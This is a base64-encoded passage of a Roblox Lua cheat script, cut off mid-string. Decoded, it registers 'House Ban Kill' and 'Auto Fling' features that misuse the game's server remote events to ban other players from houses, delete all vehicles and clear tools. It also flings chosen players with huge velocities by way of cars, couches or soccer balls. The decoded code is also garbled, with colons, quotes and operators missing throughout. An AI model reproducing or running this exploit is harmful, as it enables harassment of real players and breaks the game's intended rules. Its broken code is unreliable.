ICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgQ2xpY2tEZXRlY3RvciA9IEJ1eURldGVjdG9yRmluZEZpcnN0Q2hpbGQoQ2xpY2tEZXRlY3RvcikKICAgICAgICAgICAgICAgICAgICAgICAgaWYgQ2xpY2tEZXRlY3RvciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJlY2xpY2tkZXRlY3RvcihDbGlja0RldGVjdG9yKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgLS0gRmlyZSB0aGUgbmV3IHJlbW90ZSBldmVudCB0byBidWlsZCB0aGUgaG91c2UKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGhvdXNlTnVtYmVyLCAtLSBSYW5kb20gaG91c2UgbnVtYmVyCiAgICAgICAgICAgICAgICAgICAgICAgIDA1Nl9Ib3VzZSAtLSBIb3VzZSB0eXBlCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKVdhaXRGb3JDaGlsZChSZW1vdGVzKVdhaXRGb3JDaGlsZChMb3RCdWlsZFByb3BlcnR5KUZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHByaW50KE5vIGF2YWlsYWJsZSBob3VzZXMgdG8gYnV5ISkKICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgIGxvY2FsIFByZUhvdXNlID0gSG91c2VzRmluZEZpcnN0Q2hpbGQoUGxheWVyLk5hbWUgLi4gSG91c2UpCiAgICAgICAgICAgIGlmIFByZUhvdXNlIHRoZW4KICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgICAgICBsb2NhbCBOdW1iZXIKICAgICAgICAgICAgICAgIGZvciBpLCB4IGluIHBhaXJzKFByZUhvdXNlR2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiB4Lk5hbWUgPT0gTnVtYmVyIGFuZCB4SXNBKE51bWJlclZhbHVlKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIE51bWJlciA9IHgKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKS5SRUZpbmRGaXJzdENoaWxkKDFHZXR0aW4xZ0hvdXMxZSlGaXJlU2VydmVyKFBpY2tpbmdDdXN0b21Ib3VzZSwgMDQ5X0hvdXNlLCBOdW1iZXIuVmFsdWUpCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgbG9jYWwgUENhciA9IFZlaGljbGVzRmluZEZpcnN0Q2hpbGQoUGxheWVyLk5hbWUgLi4gQ2FyKQogICAgICAgICAgICBpZiBub3QgUENhciB0aGVuCiAgICAgICAgICAgICAgICBpZiBDaGVjaygpIHRoZW4KICAgICAgICAgICAgICAgICAgICBSb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KDExMTguODEsIDc1Ljk5OCwgLTExMzguNjEpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShSZXBsaWNhdGVkU3RvcmFnZSkuUkVGaW5kRmlyc3RDaGlsZCgxQ2ExcilGaXJlU2VydmVyKFBpY2tpbmdDYXIsIFNjaG9vbEJ1cykKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgICAgIGxvY2FsIFBDYXIgPSBWZWhpY2xlc0ZpbmRGaXJzdENoaWxkKFBsYXllci5OYW1lIC4uIENhcikKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgICAgIGxvY2FsIFNlYXQgPSBQQ2FyRmluZEZpcnN0Q2hpbGQoQm9keSkgYW5kIFBDYXIuQm9keUZpbmRGaXJzdENoaWxkKFZlaGljbGVTZWF0KQogICAgICAgICAgICAgICAgICAgIGlmIFNlYXQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBSb290UGFydC5DRnJhbWUgPSBTZWF0LkNGcmFtZSAgQ0ZyYW1lLm5ldygwLCBtYXRoLnJhbmRvbSgtMSwgMSksIDApCiAgICAgICAgICAgICAgICAgICAgICAgIHVudGlsIEh1bWFub2lkLlNpdAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgbG9jYWwgUENhciA9IFZlaGljbGVzRmluZEZpcnN0Q2hpbGQoUGxheWVyLk5hbWUgLi4gQ2FyKQogICAgICAgICAgICBpZiBQQ2FyIHRoZW4KICAgICAgICAgICAgICAgIGlmIG5vdCBIdW1hbm9pZC5TaXQgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIFNlYXQgPSBQQ2FyRmluZEZpcnN0Q2hpbGQoQm9keSkgYW5kIFBDYXIuQm9keUZpbmRGaXJzdENoaWxkKFZlaGljbGVTZWF0KQogICAgICAgICAgICAgICAgICAgIGlmIFNlYXQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBSb290UGFydC5DRnJhbWUgPSBTZWF0LkNGcmFtZSAgQ0ZyYW1lLm5ldygwLCBtYXRoLnJhbmRvbSgtMSwgMSksIDApCiAgICAgICAgICAgICAgICAgICAgICAgIHVudGlsIEh1bWFub2lkLlNpdAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgbG9jYWwgVGFyZ2V0ID0gc2VsZWN0ZWRQbGF5ZXIKICAgICAgICAgICAgICAgIGxvY2FsIFRhcmdldEMgPSBUYXJnZXQuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICBsb2NhbCBUYXJnZXRIID0gVGFyZ2V0Q0ZpbmRGaXJzdENoaWxkT2ZDbGFzcyhIdW1hbm9pZCkKICAgICAgICAgICAgICAgIGxvY2FsIFRhcmdldFJQID0gVGFyZ2V0Q0ZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpCiAgICAgICAgICAgICAgICBpZiBUYXJnZXRDIGFuZCBUYXJnZXRIIGFuZCBUYXJnZXRSUCB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IFRhcmdldEguU2l0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgbm90IFRhcmdldEguU2l0IGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgRmxpbmcgPSBmdW5jdGlvbih0YXJnZXQsIHBvcywgYW5nbGUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENhclNldFByaW1hcnlQYXJ0Q0ZyYW1lKENGcmFtZS5uZXcodGFyZ2V0LlBvc2l0aW9uKSAgcG9zICBhbmdsZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgQW5nbGVzID0gQW5nbGVzICsgMTAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBGbGluZyhUYXJnZXRSUCwgQ0ZyYW1lLm5ldygwLCAxLjUsIDApICsgVGFyZ2V0SC5Nb3ZlRGlyZWN0aW9uICBUYXJnZXRSUC5WZWxvY2l0eS5NYWduaXR1ZGUgIDEuMTAsIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoQW5nbGVzKSwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBGbGluZyhUYXJnZXRSUCwgQ0ZyYW1lLm5ldygwLCAtMS41LCAwKSArIFRhcmdldEguTW92ZURpcmVjdGlvbiAgVGFyZ2V0UlAuVmVsb2NpdHkuTWFnbml0dWRlICAxLjEwLCBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKEFuZ2xlcyksIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRmxpbmcoVGFyZ2V0UlAsIENGcmFtZS5uZXcoMi4yNSwgMS41LCAtMi4yNSkgKyBUYXJnZXRILk1vdmVEaXJlY3Rpb24gIFRhcmdldFJQLlZlbG9jaXR5Lk1hZ25pdHVkZSAgMS4xMCwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZXMpLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZsaW5nKFRhcmdldFJQLCBDRnJhbWUubmV3KC0yLjI1LCAtMS41LCAyLjI1KSArIFRhcmdldEguTW92ZURpcmVjdGlvbiAgVGFyZ2V0UlAuVmVsb2NpdHkuTWFnbml0dWRlICAxLjEwLCBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKEFuZ2xlcyksIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRmxpbmcoVGFyZ2V0UlAsIENGcmFtZS5uZXcoMCwgMS41LCAwKSArIFRhcmdldEguTW92ZURpcmVjdGlvbiAgVGFyZ2V0UlAuVmVsb2NpdHkuTWFnbml0dWRlICAxLjEwLCBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKEFuZ2xlcyksIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRmxpbmcoVGFyZ2V0UlAsIENGcmFtZS5uZXcoMCwgLTEuNSwgMCkgKyBUYXJnZXRILk1vdmVEaXJlY3Rpb24gIFRhcmdldFJQLlZlbG9jaXR5Lk1hZ25pdHVkZSAgMS4xMCwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZXMpLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEhvdXNlID0gSG91c2VzRmluZEZpcnN0Q2hpbGQoUGxheWVyLk5hbWUgLi4gSG91c2UpCiAgICAgICAgICAgICAgICAgICAgICAgIFBDYXJTZXRQcmltYXJ5UGFydENGcmFtZShDRnJhbWUubmV3KEhvdXNlLkhvdXNlU3Bhd25Qb3NpdGlvbi5Qb3NpdGlvbikpCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHJlZ2lvbiA9IFJlZ2lvbjMubmV3KGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbiAtIFZlY3RvcjMubmV3KDMwLCAzMCwgMzApLCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24gKyBWZWN0b3IzLm5ldygzMCwgMzAsIDMwKSkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcGFydHNJblJlZ2lvbiA9IHdvcmtzcGFjZUZpbmRQYXJ0c0luUmVnaW9uMyhyZWdpb24sIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydCwgbWF0aC5odWdlKQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgaSwgdiBpbiBwYWlycyhwYXJ0c0luUmVnaW9uKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdi5OYW1lID09IEh1bWFub2lkUm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGIgPSBnYW1lR2V0U2VydmljZShQbGF5ZXJzKUZpbmRGaXJzdENoaWxkKHYuUGFyZW50Lk5hbWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWzFdID0gQmFuUGxheWVyRnJvbUhvdXNlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbMl0gPSBiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbM10gPSB2LlBhcmVudAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShSZXBsaWNhdGVkU3RvcmFnZSkuUkVGaW5kRmlyc3RDaGlsZCgxUGxheWUxclRyaWdnZTFyRXZlbjF0KUZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsxXSA9IERlbGV0ZUFsbFZlaGljbGVzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKS5SRUZpbmRGaXJzdENoaWxkKDFDYTFyKUZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCmVuZAoKVHJvbGxBZGRCdXR0b24oewogICAgTmFtZSA9IEhvdXNlIEJhbiBLaWxsLAogICAgQ2FsbGJhY2sgPSBob3VzZUJhbktpbGwKfSkKCmxvY2FsIFBsYXllcnMgPSBnYW1lR2V0U2VydmljZShQbGF5ZXJzKQpsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgY2FtID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKbG9jYWwgY3VycmVudFBsYXllcnMsIHNlbGVjdGVkUGxheWVyID0ge30sIG5pbApsb2NhbCB2aWV3aW5nID0gZmFsc2UKbG9jYWwgZmxpbmdBY3RpdmUgPSBmYWxzZQoKVHJvbGxBZGRUb2dnbGUoewogICAgTmFtZSA9IEF1dG8gRmxpbmcgLAogICAgRGVmYXVsdCA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKCiAgICAgICAgZmxpbmdBY3RpdmUgPSBzdGF0ZQogICAgICAgIGlmIHN0YXRlIGFuZCBzZWxlY3RlZFBsYXllck5hbWUgdGhlbgogICAgICAgICAgICBsb2NhbCB0YXJnZXQgPSBQbGF5ZXJzRmluZEZpcnN0Q2hpbGQoc2VsZWN0ZWRQbGF5ZXJOYW1lKQogICAgICAgICAgICBpZiBub3QgdGFyZ2V0IG9yIG5vdCB0YXJnZXQuQ2hhcmFjdGVyIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICBsb2NhbCByb290ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChIdW1hbm9pZFJvb3RQYXJ0KQogICAgICAgICAgICBsb2NhbCB0Um9vdCA9IHRhcmdldC5DaGFyYWN0ZXIgYW5kIHRhcmdldC5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChIdW1hbm9pZFJvb3RQYXJ0KQogICAgICAgICAgICBpZiBub3Qgcm9vdCBvciBub3QgdFJvb3QgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIGxvY2FsIGNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgbG9jYWwgaHVtID0gY2hhckZpbmRGaXJzdENoaWxkT2ZDbGFzcyhIdW1hbm9pZCkKICAgICAgICAgICAgbG9jYWwgb3JpZ2luYWwgPSByb290LkNGcmFtZQoKbG9jYWwgYXJncyA9IHsKCUNsZWFyQWxsVG9vbHMKfQpnYW1lR2V0U2VydmljZShSZXBsaWNhdGVkU3RvcmFnZSlXYWl0Rm9yQ2hpbGQoUkUpV2FpdEZvckNoaWxkKDFDbGVhMXJUb29sMXMpRmlyZVNlcnZlcih1bnBhY2soYXJncykpCgp0YXNrLndhaXQoMC4yKQoKCiAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgICAgICBbMV0gPSBQaWNraW5nVG9vbHMsCiAgICAgICAgICAgICAgICBbMl0gPSBDb3VjaAogICAgICAgICAgICB9CiAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKS5SRUZpbmRGaXJzdENoaWxkKDFUb28xbClJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQoKICAgICAgICAgICAgdGFzay53YWl0KDAuMykKICAgICAgICAgICAgbG9jYWwgdG9vbCA9IExvY2FsUGxheWVyLkJhY2twYWNrRmluZEZpcnN0Q2hpbGQoQ291Y2gpCiAgICAgICAgICAgIGlmIHRvb2wgdGhlbgogICAgICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBjaGFyCiAgICAgICAgICAgIGVuZAoJCQkJdGFzay53YWl0KDAuMikKCQkJCWdhbWVHZXRTZXJ2aWNlKFZpcnR1YWxJbnB1dE1hbmFnZXIpU2VuZEtleUV2ZW50KHRydWUsIEVudW0uS2V5Q29kZS5GLCBmYWxzZSwgZ2FtZSkKdGFzay53YWl0KDAuMjUpCgogICAgICAgICAgICB3b3Jrc3BhY2UuRmFsbGVuUGFydHNEZXN0cm95SGVpZ2h0ID0gMDAKICAgICAgICAgICAgbG9jYWwgYnYgPSBJbnN0YW5jZS5uZXcoQm9keVZlbG9jaXR5KQogICAgICAgICAgICBidi5OYW1lID0gRmxpbmdGb3JjZQogICAgICAgICAgICBidi5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDllOCwgOWU4LCA5ZTgpCiAgICAgICAgICAgIGJ2Lk1heEZvcmNlID0gVmVjdG9yMy5uZXcoMTAsIDEwLCAxMCkKICAgICAgICAgICAgYnYuUGFyZW50ID0gcm9vdAogICAgICAgICAgICBodW1TZXRTdGF0ZUVuYWJsZWQoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5TZWF0ZWQsIGZhbHNlKQogICAgICAgICAgICBodW0uUGxhdGZvcm1TdGFuZCA9IGZhbHNlCiAgICAgICAgICAgIGNhbS5DYW1lcmFTdWJqZWN0ID0gdGFyZ2V0LkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEhlYWQpIG9yIHRSb290IG9yIGh1bQoKICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsb2NhbCBhbmdsZSA9IDAKICAgICAgICAgICAgICAgIGxvY2FsIHBhcnRzID0ge3Jvb3R9CiAgICAgICAgICAgICAgICB3aGlsZSBmbGluZ0FjdGl2ZSBhbmQgdGFyZ2V0IGFuZCB0YXJnZXQuQ2hhcmFjdGVyIGFuZCB0YXJnZXQuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGRPZkNsYXNzKEh1bWFub2lkKSBkbwogICAgICAgICAgICAgICAgICAgIGxvY2FsIHRIdW0gPSB0YXJnZXQuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGRPZkNsYXNzKEh1bWFub2lkKQogICAgICAgICAgICAgICAgICAgIGlmIHRIdW0uU2l0IHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgICAgICAgICAgYW5nbGUgKz0gNTAKCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHBhcnQgaW4gaXBhaXJzKHBhcnRzKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBwb3NfeCA9IHRhcmdldC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbi5YCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHBvc195ID0gdGFyZ2V0LkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uLlkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcG9zX3ogPSB0YXJnZXQuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24uWgogICAgICAgICAgICAgICAgICAgICAgICBwb3NfeCA9IHBvc194ICsgKHRhcmdldC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5WZWxvY2l0eS5YICAxLjUpCiAgICAgICAgICAgICAgICAgICAgICAgIHBvc195ID0gcG9zX3kgKyAodGFyZ2V0LkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlZlbG9jaXR5LlkgIDEuNSkKICAgICAgICAgICAgICAgICAgICAgICAgcG9zX3ogPSBwb3NfeiArICh0YXJnZXQuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuVmVsb2NpdHkuWiAgMS41KQogICAgICAgICAgICAgICAgICAgICAgICByb290LkNGcmFtZSA9IENGcmFtZS5uZXcocG9zX3gsIHBvc195LCBwb3NfeikgIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoYW5nbGUpLCAwLCAwKQogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICByb290LlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoOWU4LCA5ZTgsIDllOCkKICAgICAgICAgICAgICAgICAgICByb290LlJvdFZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoOWU4LCA5ZTgsIDllOCkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBmbGluZ0FjdGl2ZSA9IGZhbHNlCiAgICAgICAgICAgICAgICBidkRlc3Ryb3koKQogICAgICAgICAgICAgICAgaHVtU2V0U3RhdGVFbmFibGVkKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuU2VhdGVkLCB0cnVlKQogICAgICAgICAgICAgICAgaHVtLlBsYXRmb3JtU3RhbmQgPSBmYWxzZQogICAgICAgICAgICAgICAgcm9vdC5DRnJhbWUgPSBvcmlnaW5hbAogICAgICAgICAgICAgICAgY2FtLkNhbWVyYVN1YmplY3QgPSBodW0KICAgICAgICAgICAgICAgIGZvciBfLCBwIGluIHBhaXJzKGNoYXJHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHBJc0EoQmFzZVBhcnQpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcC5WZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgICAgICAgICAgICAgICAgICAgICBwLlJvdFZlbG9jaXR5ID0gVmVjdG9yMy56ZXJvCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGh1bVVuZXF1aXBUb29scygpCiAgICAgICAgICAgICAgICBnYW1lR2V0U2VydmljZShSZXBsaWNhdGVkU3RvcmFnZSkuUkVGaW5kRmlyc3RDaGlsZCgxVG9vMWwpSW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kCn0pCgoKbG9jYWwgZnVuY3Rpb24gRmxpbmdCYWxsKHRhcmdldCkKCiAgICBsb2NhbCBwbGF5ZXJzID0gZ2FtZUdldFNlcnZpY2UoUGxheWVycykKICAgIGxvY2FsIHBsYXllciA9IHBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkV2FpdCgpCiAgICBsb2NhbCBodW1hbm9pZCA9IGNoYXJhY3RlcldhaXRGb3JDaGlsZChIdW1hbm9pZCkKICAgIGxvY2FsIGhycCA9IGNoYXJhY3RlcldhaXRGb3JDaGlsZChIdW1hbm9pZFJvb3RQYXJ0KQogICAgbG9jYWwgYmFja3BhY2sgPSBwbGF5ZXJXYWl0Rm9yQ2hpbGQoQmFja3BhY2spCiAgICBsb2NhbCBTZXJ2ZXJCYWxscyA9IHdvcmtzcGFjZS5Xb3Jrc3BhY2VDb21XYWl0Rm9yQ2hpbGQoMDAxX1NvY2NlckJhbGxzKQoKICAgIGxvY2FsIGZ1bmN0aW9uIEdldEJhbGwoKQogICAgICAgIGlmIG5vdCBiYWNrcGFja0ZpbmRGaXJzdENoaWxkKFNvY2NlckJhbGwpIHRoZW4KICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpLlJFRmluZEZpcnN0Q2hpbGQoMVRvbzFsKUludm9rZVNlcnZlcihQaWNraW5nVG9vbHMsIFNvY2NlckJhbGwpCiAgICAgICAgZW5kCiAgICAgICAgcmVwZWF0IHRhc2sud2FpdCgpIHVudGlsIGJhY2twYWNrRmluZEZpcnN0Q2hpbGQoU29jY2VyQmFsbCkKICAgICAgICBiYWNrcGFjay5Tb2NjZXJCYWxsLlBhcmVudCA9IGNoYXJhY3RlcgogICAgICAgIHJlcGVhdCB0YXNrLndhaXQoKSB1bnRpbCBTZXJ2ZXJCYWxsc0ZpbmRGaXJzdENoaWxkKFNvY2NlciAuLiBwbGF5ZXIuTmFtZSkKICAgICAgICBjaGFyYWN0ZXIuU29jY2VyQmFsbC5QYXJlbnQgPSBiYWNrcGFjawogICAgICAgIHJldHVybiBTZXJ2ZXJCYWxsc0ZpbmRGaXJzdENoaWxkKFNvY2NlciAuLiBwbGF5ZXIuTmFtZSkKICAgIGVuZAoKICAgIGxvY2FsIEJhbGwgPSBTZXJ2ZXJCYWxsc0ZpbmRGaXJzdENoaWxkKFNvY2NlciAuLiBwbGF5ZXIuTmFtZSkgb3IgR2V0QmFsbCgpCiAgICBCYWxsLkNhbkNvbGxpZGUgPSBmYWxzZQogICAgQmFsbC5NYXNzbGVzcyA9IHRydWUKICAgIEJhbGwuQ3VzdG9tUGh5c2ljYWxQcm9wZXJ0aWVzID0gUGh5c2ljYWxQcm9wZXJ0aWVzLm5ldygwLjAwMDEsIDAsIDApCgogICAgaWYgdGFyZ2V0IH49IHBsYXllciB0aGVuCiAgICAgICAgbG9jYWwgdGNoYXIgPSB0YXJnZXQuQ2hhcmFjdGVyCiAgICAgICAgaWYgdGNoYXIgYW5kIHRjaGFyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkgYW5kIHRjaGFyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWQpIHRoZW4KICAgICAgICAgICAgbG9jYWwgdHJvb3QgPSB0Y2hhci5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgICAgIGxvY2FsIHRodW0gPSB0Y2hhci5IdW1hbm9pZAoKICAgICAgICAgICAgaWYgQmFsbEZpbmRGaXJzdENoaWxkV2hpY2hJc0EoQm9keVZlbG9jaXR5KSB0aGVuCiAgICAgICAgICAgICAgICBCYWxsRmluZEZpcnN0Q2hpbGRXaGljaElzQShCb2R5VmVsb2NpdHkpRGVzdHJveSgpCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgbG9jYWwgYnYgPSBJbnN0YW5jZS5uZXcoQm9keVZlbG9jaXR5KQogICAgICAgICAgICBidi5OYW1lID0gRmxpbmdQb3dlcgogICAgICAgICAgICBidi5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDllOCwgOWU4LCA5ZTgpCiAgICAgICAgICAgIGJ2Lk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLCBtYXRoLmh1Z2UsIG1hdGguaHVnZSkKICAgICAgICAgICAgYnYuUCA9IDllOTAwCiAgICAgICAgICAgIGJ2LlBhcmVudCA9IEJhbGwKCiAgICAgICAgICAgIHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNhbWVyYVN1YmplY3QgPSB0aHVtCiAgICAgICAgICAgIGxvY2FsIFN0YXJ0VGltZSA9IG9zLnRpbWUoKQogICAgICAgICAgICByZXBlYXQKICAgICAgICAgICAgICAgIGlmIHRyb290LlZlbG9jaXR5Lk1hZ25pdHVkZSAgMCB0aGVuCiAgICAgICAgICAgICAgICAtLSBDYWxjdWxhdGUgYWRqdXN0ZWQgcG9zaXRpb24gYmFzZWQgb24gdGFyZ2V0J3MgdmVsb2NpdHkKICAgICAgICAgICAgICAgIGxvY2FsIHBvc194ID0gdHJvb3QuUG9zaXRpb24uWCArICh0cm9vdC5WZWxvY2l0eS5YICAxLjUpCiAgICAgICAgICAgICAgICBsb2NhbCB